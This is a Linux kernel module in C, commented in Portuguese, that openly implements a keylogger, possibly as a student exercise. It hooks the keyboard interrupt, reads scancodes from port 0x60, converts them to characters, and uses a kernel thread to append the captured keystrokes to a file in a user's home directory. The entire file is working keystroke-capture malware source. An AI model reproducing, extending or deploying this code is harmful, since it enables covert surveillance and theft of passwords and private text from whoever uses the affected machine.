//Modulo para o kernel do linux que se comporta como um keylogger.
//Autores: Christofer Daniel
//Data: 02/11/2022

#include <linux/kernel.h> //Contem prototipos comuns de funcoes
#include <linux/module.h> //Modulo onde as funcões init e exit sao definidas
#include <linux/interrupt.h> //Usado para definicao de interrupcoes
#include <asm/io.h> //Usado para acesso a portas de I/O
#include <linux/init.h> //Usado apra a definicão das macros init e exit
#include <linux/fs.h>   //Funções de acesso ao file system
#include <linux/uaccess.h> // Necessário para as funcoes de acesso a memoria
#include <linux/kthread.h> // Biblioteca usada para threads
#include <linux/sched.h>   // Usada para a 'task_sctruct'
#include <linux/delay.h>   // Usada para o usdo da funcao msleep()

#define KBD_IRQ 1              // valor IRQ para teclado (i8042)
#define KBD_DATA_REG 0x60      // Porta para o I/O do teclado
#define KBD_SCANCODE_MASK 0x7f // Mascara para o scancode do teclado
#define KBD_STATUS_MASK 0x80   // Mascara para ver se a tecla foi pressionada ou solta
#define procfs_name "keylogger3"
#define FILE_PATH "/home/user_example/Documentos/kernel_file"

// Vetor que mapeia o scancode de cada tecla para um caractere ASCII.
// Os valores que retornam do scancode pode ser usado como indice para este vetor, e entao
// Retorna um caractere que e correspondente a tecla presisonada.
// As posicoes definidas com -1 estão assim pois foi decidido por naao mapear elas
// pois foi considerado desnecessario.
char kbd_US[128] =
    {-1,27,'1','2','3','4','5','6','7','8','9','0','-','=','B','T','q','w','e','r','t','y','u','i','o','p','[',']','N',-1,'a','s','d','f','g','h','j','k','l',';','\'','`','S','\\','z','x','c','v','b','n','m',',','.','/',-1,'*',-1,' ','C',
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,'-',-1,-1,-1,'+',-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    };

static struct task_struct *etx_thread; // Declaracao da struct da thread
static char buf2[50];                  // Bufer que vai acumular os caracteres digitados
static char buf2C[50];                 // Bufer que vai conter os caracteres copiados do buf2 quando forem ser gravados no arquivo
struct file *fp;                       // Estrutura do file
mm_segment_t fs;                       // Necessario para o uso das funcoes set_fs() e get_fs()
loff_t pos;         // Ultima posicao editada no arquivo.
int indice = 0;     // Conta quantos caracteres foram digitados.
int indexAtual = 0; // Conta quantos caracteres foram digitados a parti da ultima gravacao no arquivo
int indexT = 0;     // Salva quantos caracteres foram digitados ate o momento em que a gravacao oesta sendo feita
int esvaziar = 0;   // Indica se o vetor de caracteres digitados deve ser esvaziado
int ultimoEsc = 0;  // Ultima posicão de escrita no arquivo
int i = 0;          // Variavel de controle do laco
int esvaziado = 0;  // Flag para indicar se o vetor foi esvaziado, e necessaria para um edge case muito especifico
char bN = '\n';

int thread_function(void *pv)
{
    // int i2=0;
    while (!kthread_should_stop())
    { // Executa enquanto o sinal de stop nao chega
        if (esvaziar)
        { // verifica se o vetor precia ser esvaziado
            // pr_info("Dentro da thread %d\n esvaziar %d", i2++, esvaziar);
            fp = filp_open(FILE_PATH, O_RDWR | O_CREAT | O_APPEND, 0644);
            if (IS_ERR(fp))
            { // Verifica se o arquivo foi aberto
                printk("erro ao criar arquivo\n");
                return -1;
            }
            fs = get_fs();
            set_fs(KERNEL_DS);
            pos = ultimoEsc;                    // Posicao em que deve se escrever no arquivo e setada para a ultima posicao escrita
            ultimoEsc = ultimoEsc + indexT + 2; // Variavel que controla a ultima posicao que foi escrita no arquivo e incrementada com
            // a quantidade de caracteres que serao escritos no momento, mais o deslocamento necessario para as proximas escritas comecarem do lugar correto
            vfs_write(fp, buf2C, indexT, &pos); // Escreve no arquivo, (arquivo, vetor de caracteres, quantidade de caracteres, posicao)
            pos = pos + 1;                      // Icrementa a posicao para escrever a quebra de linha
            vfs_write(fp, &bN, 1, &pos);        // Coloca a quebra de linha no arquivo
            filp_close(fp, NULL);               // Fecha o arquivo
            set_fs(fs);
            esvaziar = 0;  // Desmarca a flag que indica que o vetor precisa ser esvaziado
            esvaziado = 1; // Marca que o vetor acabou de ser esvaziado e nao tem caracteres que precisam ser colocados no arquivo
        }
        msleep(1000); // Aguarda 1 segudno para fazer a proxima verificacao
    }
    return 0;
}

// Funcao utilizada para converter o scancode da tecla para um caractere ASCII.
char conversor(int keyScancode) // Funcao usada para converter o scancode para o caractere correspondente
{
    return kbd_US[keyScancode];
}

static irqreturn_t kbd2_isr(int irq, void *dev_id) // Declaracao da interruption request para as teclas do teclado
{
    char scancode;
    scancode = inb(KBD_DATA_REG); // Le o scancode da tecla presionada a partir dessa porta definida
    if (!(scancode & KBD_STATUS_MASK))
    { // Passa a mascara no scancode para ver se a tecla foi pressionada ou sota. O if executa quando a tecla e pressionada
        if (conversor(scancode & KBD_SCANCODE_MASK) != -1)
        { // Verifica se o retorno e um caractere mapeado
            //pr_info("Scan Code %c %s index: %d\n", conversor(scancode & KBD_SCANCODE_MASK), "Pressed", indexAtual);
            if (indexAtual > 30)
            {                        // Verifica se tem mais de 30 caracteres digitados
                indexT = indexAtual; // Variavel temporaria salva quantos caracteres foram pressionados
                indexAtual = 1;      // Variavel que guarda quantos caracteres foram digitados desde a ultima gravacao ate o momento
                esvaziar = 1;        // Marca a flag indicando que o vetor precisa ser escrito no arquivo
                for (i = 0; i < indexT; i++)
                { // Copia do vetor que guarda os caracteres digitados para o vetor que vai ser usado pela thread para gravar no arquivo
                    buf2C[i] = buf2[i];
                }
            }
            if (indexAtual < 49)
            {                                                               // Verifica se o indexAtual esta menor que o tamanho maximo do bufer para nao causar falha de segmentacao
                buf2[indexAtual] = conversor(scancode & KBD_SCANCODE_MASK); // Bufer recebe o caractere da tecla pressionada
                indice = indice + 1;                                        // Incrementa um no indice de teclas totais pressionadas
                indexAtual = indexAtual + 1;                                // Incrementa um no indice de telcas precionadas desde a ultima gravacao no arquivo
                esvaziado = 0;                                              // Marca que exites mais caracteres a serem gravados
            }
        }
    }

    return IRQ_HANDLED;
}

int __init test_init(void) // Declaracao da funcao init que e obrigatória em todo modulo, esse funcao e chamada sempre que o modulo e insalado
{
    printk("test enter\n");
    buf2[0] = '>'; // Colocado um caractere indicado na primeiraṕosicao do bufer
    indice = indice + 1;
    indexAtual = 1;
    etx_thread = kthread_create(thread_function, NULL, "eTx Thread"); // Cria a thread atribuindo a tarefa que ele executa
    if (etx_thread)
    { // Verifica se a thread foi criada
        wake_up_process(etx_thread);
    }
    else
    {
        pr_err("Cannot create kthread\n");
    }
    pr_info("Modulo instalado com sucesso.");
    return request_irq(KBD_IRQ, kbd2_isr, IRQF_SHARED, "kbd2", (void *)kbd2_isr); // Retorna o irq criado para receber as interrupcaes do teclado
}
void __exit test_exit(void) // Declaracao da funcao exit que e obrigatória em todo modulo, essa funcao executa sempre que o modulo e desinstalado, normalmente usada para desalocar estruturas criadas no init
{
    free_irq(KBD_IRQ, (void *)kbd2_isr); // Liberacao da estrutura do interruption request
    kthread_stop(etx_thread);            // Liberacao da thread
    printk(KERN_INFO "Thread parada\n");
    if (!esvaziado)
    { // Verifica se o bufer esta vazio
        fp = filp_open(FILE_PATH, O_RDWR | O_CREAT | O_APPEND, 0644);
        if (IS_ERR(fp))
        {
            printk("falha ao cria arquivo no fim\n");
            return;
        }
        fs = get_fs(); // O uso do get_fs() e do set_fs() e necessario apra mover o limite da barreira dos enderecamentos de memória 
                       // do que e memória de usuario e o que e memória de kernel, esse modificacao e necessaria para que as funcoes de write
                       // no arquivo possam ser realizadas, pois normalmente isso e feito em espaco de usuario; Isso e necessario pois a
                       // system call read() nao se permite acessar memoria de kernel, por isso, o limite do que e memoria de usuario e memoria de kernel
                       // deve ser modificada antes da escrita de um arquivo que estasendo executado em um modulo do kernel.
        set_fs(KERNEL_DS);
        pos = ultimoEsc;
        ultimoEsc = ultimoEsc + indexT + 1;
        vfs_write(fp, buf2, indexAtual, &pos);
        filp_close(fp, NULL);
        set_fs(fs);
    }
    pr_info("Modulo removido.");
    //pr_info("/proc/%s removido\n", procfs_name);
}

module_init(test_init); // Macro usada para exportar funcoes
module_exit(test_exit);

MODULE_LICENSE("GPL"); // Declaracao da licenca do modulo, obrigatoria para todo modulo
